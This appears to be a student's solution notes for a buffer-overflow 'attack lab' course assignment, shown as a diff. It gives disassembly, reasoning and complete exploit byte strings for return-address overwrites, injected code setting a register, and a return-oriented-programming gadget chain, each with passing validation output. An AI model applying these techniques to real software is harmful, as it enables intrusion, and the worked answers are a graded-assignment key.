@@ -1,0 +1,219 @@
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Level 1:
+disas getbuf
+=> 0x000000000040140a <+0>:     sub    $0x38,%rsp
+   0x000000000040140e <+4>:     mov    %rsp,%rdi
+   0x0000000000401411 <+7>:     callq  0x4016aa <Gets>
+   0x0000000000401416 <+12>:    mov    $0x1,%eax
+   0x000000000040141b <+17>:    add    $0x38,%rsp
+   0x000000000040141f <+21>:    retq  
+   
+   
+  0000000000401420 <touch1>:
+  401420:	48 83 ec 08          	sub    $0x8,%rsp
+  401424:	c7 05 4e f5 2e 00 01 	movl   $0x1,0x2ef54e(%rip)        # 6f097c <vlevel>
+  40142b:	00 00 00 
+  40142e:	48 8d 3d 88 0a 0c 00 	lea    0xc0a88(%rip),%rdi        # 4c1ebd <_IO_stdin_used+0x27d>
+  401435:	e8 56 22 01 00       	callq  413690 <_IO_puts>
+  40143a:	bf 01 00 00 00       	mov    $0x1,%edi
+  40143f:	e8 f7 05 00 00       	callq  401a3b <validate>
+  401444:	bf 00 00 00 00       	mov    $0x0,%edi
+  401449:	e8 12 f9 00 00       	callq  410d60 <exit>
+  
+  sub    $0x38,%rsp == hex value of 56. Pad by 56 bytes. 
+  so I need to pad by 56 bytes...
+  touch 1 address 401420
+  text file should be formatted in LITTLE ENDIAN
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //56 bytes of padding
+20 14 40 00 00 00 00 00 address of touch1
+
+Put that in a doc. Use hex2raw on the txt file. Run the txtfile. 
+
+Cookie: 0x4b3c2ac7
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Level 2:
+Injecting code and then calling function touch2 while making it appear as though the cookie was passed as an argument to touch2
+
+000000000040144e <touch2>:
+  40144e:	48 83 ec 08          	sub    $0x8,%rsp
+  401452:	89 fa                	mov    %edi,%edx
+  401454:	c7 05 1e e5 2e 00 02 	movl   $0x2,0x2ee51e(%rip)        # 6ef97c <vlevel>
+  40145b:	00 00 00 
+  40145e:	39 3d 20 e5 2e 00    	cmp    %edi,0x2ee520(%rip)        # 6ef984 <cookie>
+  401464:	74 2a                	je     401490 <touch2+0x42>
+  401466:	48 8d 35 7b 09 0c 00 	lea    0xc097b(%rip),%rsi        # 4c1de8 <_IO_stdin_used+0x2c8>
+  40146d:	bf 01 00 00 00       	mov    $0x1,%edi
+  401472:	b8 00 00 00 00       	mov    $0x0,%eax
+  401477:	e8 64 00 05 00       	callq  4514e0 <___printf_chk>
+  40147c:	bf 02 00 00 00       	mov    $0x2,%edi
+  401481:	e8 8c 05 00 00       	callq  401a12 <fail>
+  401486:	bf 00 00 00 00       	mov    $0x0,%edi
+  40148b:	e8 b0 f7 00 00       	callq  410c40 <exit>
+  401490:	48 8d 35 29 09 0c 00 	lea    0xc0929(%rip),%rsi        # 4c1dc0 <_IO_stdin_used+0x2a0>
+  401497:	bf 01 00 00 00       	mov    $0x1,%edi
+  40149c:	b8 00 00 00 00       	mov    $0x0,%eax
+  4014a1:	e8 3a 00 05 00       	callq  4514e0 <___printf_chk>
+  4014a6:	bf 02 00 00 00       	mov    $0x2,%edi
+  4014ab:	e8 6a 04 00 00       	callq  40191a <validate>
+  4014b0:	eb d4                	jmp    401486 <touch2+0x38>
+  
+  
+OUR ADDRESS FOR TOUCH2: 40144e
+
+"Recall that the first argument to a function is passed in register %rdi."
+Mod the RDI registry and put our cookie in there...
+
+OMG we have to write assembly code gross
+
+  movq $0x4b3c2ac7, %rdi 
+  retq
+  save that as phase2.s
+  then take that phase2.s and get the byte representation of it using GCC to compile then disassemble
+  
+  The byte rep is this:
+  48 c7 c7 c7 2a 3c 4b c3
+  
+  Now find the address of rsp register
+  gdb ctarget
+  break getbuf
+  Dump of assembler code for function getbuf:
+=> 0x000000000040140a <+0>:     sub    $0x38,%rsp
+   0x000000000040140e <+4>:     mov    %rsp,%rdi
+   0x0000000000401411 <+7>:     callq  0x4016aa <Gets>
+   0x0000000000401416 <+12>:    mov    $0x1,%eax
+   0x000000000040141b <+17>:    add    $0x38,%rsp
+   0x000000000040141f <+21>:    retq   
+  (wanna go until line 12)
+  until *0x0000000000401416
+  Type string:
+  Buffer is length of 56 bytes again
+  Lets mash the keyboard aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+  x/s $rsp
+  
+  Got the rsp address
+  0x55 63 24 b8
+  
+  LITTLE ENDIAN
+Raw phase2 textfile:
+48 c7 c7 c7 2a 3c 4b c3 //setting cookie
+00 00 00 00 00 00 00 00 //padding of 56 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //end of padding
+b8 24 63 55 00 00 00 00 //address of register %rsp
+4e 14 40 00 00 00 00 00 //address of touch2 function
+
+What is going on:
+Setting the register of rdi to the cookie value, which is transferred to $rsp register. After the string is entered and getbuf tries to return control to the calling function, it points to the rsp address so it will execute the code to set the cookie and finally call touch2 after the cookie is set.
+
+Cookie: 0x4b3c2ac7
+Type string:Touch2!: You called touch2(0x4b3c2ac7)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Level 3
+
+Store the cookie after touch3.
+
+Pass the address for the cookie to register $rdi
+
+The total bytes before the cookie are buffer + 8 bytes for return address of rsp + 8 bytes for touch3
+
+0x38 + 8 + 8 = 48 (72 Decimal)
+
+Grab the address for rsp from phase 2
+0x55 63 24 b8
+Add 0x48
+
+0x55 63 25 00
+
+Make some assembly code:
+
+movq $0x55632500, %rdi
+retq
+
+Same gimmick as phase2
+   0:	48 c7 c7 00 25 63 55 	mov    $0x55632500,%rdi
+   7:	c3                   	retq  
+
+byte representation of the assembly code:
+48 c7 c7 00 25 63 55 c3
+
+48 c7 c7 00 25 63 55 c3 //rsp + 40 the address where the cookie is present
+00 00 00 00 00 00 00 00 //padding of 56 bytes
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //end of padding
+b8 24 63 55 00 00 00 00 //address of register %rsp
+65 15 40 00 00 00 00 00 //touch3 address
+34 62 33 63 32 61 63 37 //cookie here(converted from hex to text)
+
+Same gimmick with hex2raw
+
+
+Cookie: 0x4b3c2ac7
+Type string:Touch3!: You called touch3("4b3c2ac7")
+Valid solution for level 3 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Phase 4
+
+Things to note:
+The byte sequence 48 89 c7 encodes the instruction movq %rax, %rdi
+
+000000000040161b <addval_246>:
+  40161b:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  401621:	c3                   	retq
+
+popq %rdi is given in the the pdf
+byte representation is 5f, not in dump file
+Look for substitute: popq %rax% with byte representation of 58
+
+000000000040160e <getval_210>:
+  40160e:	b8 58 90 90 90       	mov    $0x90909058,%eax
+  401613:	c3                   	retq  
+  
+the exploit string desired: 
+popq %rax
+movq %rax %edi
+ret
+
+40160e is the address, but 58 starts at the second byte. So we add 1. 40160f
+40161b is the address, but sequence 48 89 c7 starts at the 3rd byte. We add 2. 40 16 1d
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 //56 buffer size
+0f 16 40 00 00 00 00 00 //gadget 1: popq %rax address starts at last byte
+c7 2a 3c 4b 00 00 00 00 //cookie
+1d 16 40 00 00 00 00 00 //gadget 2: move %rax to %rdi
+4e 14 40 00 00 00 00 00 //touch2 address
+
+Cookie: 0x4b3c2ac7
+Type string:Touch2!: You called touch2(0x4b3c2ac7)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
